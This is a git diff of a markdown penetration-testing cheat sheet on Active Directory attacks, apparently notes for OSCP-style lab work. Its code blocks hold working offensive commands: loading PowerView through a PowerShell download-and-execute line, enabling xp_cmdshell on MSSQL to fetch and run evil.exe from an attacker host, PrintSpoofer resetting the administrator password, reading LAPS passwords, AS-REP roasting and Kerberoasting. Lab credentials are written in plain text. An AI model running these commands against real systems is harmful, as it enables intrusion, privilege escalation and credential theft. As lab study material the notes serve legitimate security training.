@@ -61,12 +61,22 @@ Get-Module ActiveDirectory
 ```
 ### PowerView
 
-[powershellmafia]
-
 ```powershell
-#install module
+#Load module
 powershell -ep bypass
 . .\Powerview.ps1
+
+c:\ad\tools\powerview.ps1
+
+Import-Module <PATH> 
+
+
+#Load module Remotely
+
+iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1') 
+
+#all commands of a module
+Get-Command -Module <modulename>
 
 #Get current domain
 Get-NetDomain
@@ -95,29 +105,6 @@ Get-GPPermission -GUID 'ID' -TargetType User -TargetName 'OUR_USER'
 
 ```
 
-**mssqlclient**
-```sh
-
-#sql service account tgs
-
-impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth
-
-enable_xp_cmdshell
-
-#find a dir to write on
-
-xp_cmdshell dir c:\users\public\document
-
-xp_cmdshell curl http://10.10.10.10/evil.exe  -o c:\users\public\document\evil.exe 
-
-xp_cmdshell  c:\users\public\document\evil.exe 
-
-#or use printspoofer or so to basically change the admin passowrd 
-printspoofer -i -c "net user administrator password123"
-#disable wifewall enable rdp 
-
-
-```
 
 
 ### LDAP
@@ -137,14 +124,8 @@ ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectcla
 
 #read laps pass
 nxc ldap 192.168.104.122 -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --module laps                                              
-
-```
-
-```shell
 nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
-```
 
-```shell
 nxc ldap 10.10.11.35 -u '' -p '' --users 
 ```
 ### Kerbrute
@@ -168,19 +149,33 @@ kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/word
 #query Active Directory (AD) for user information from a domain controller
 
 GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
-```
 
-
-```sh
 # Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords
 
 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
 ```
 
+**mssqlclient**
+```sh
 
->list users in domain
-```
-net user /domain
+#sql service account tgs
+
+impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth
+
+enable_xp_cmdshell
+
+#find a dir to write on
+
+xp_cmdshell dir c:\users\public\document
+
+xp_cmdshell curl http://10.10.10.10/evil.exe  -o c:\users\public\document\evil.exe 
+
+xp_cmdshell  c:\users\public\document\evil.exe 
+
+#or use printspoofer or so to basically change the admin passowrd 
+printspoofer -i -c "net user administrator password123"
+#disable wifewall enable rdp 
+
 
 ```
 
